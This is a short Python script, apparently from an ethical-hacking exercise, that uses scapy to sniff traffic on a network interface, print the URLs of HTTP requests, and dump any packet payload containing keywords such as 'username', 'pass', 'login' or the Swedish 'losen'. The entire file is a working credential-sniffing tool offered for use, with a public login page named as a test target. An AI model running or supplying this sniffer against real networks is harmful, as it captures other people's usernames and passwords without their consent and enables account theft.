#!/usr/bin/env python3

# HTTP login example site: http://www.geonames.org/login

import scapy.all as scapy
from scapy.layers import http

from configparser import ConfigParser
parser = ConfigParser()
parser.read('config.ini')
interface = parser.get('main', 'interface')

# Keywords to search for
keywords = ['username', 'user', 'pass', 'password', 'login', 'email', 'e-mail', 'losen', 'anv']

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		# print(packet.show())  # Useful debug
		print("[+] HTTP Request >> " + get_url(packet))
		
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible user/pass >> " + login_info + '\n\n')


sniff(interface)
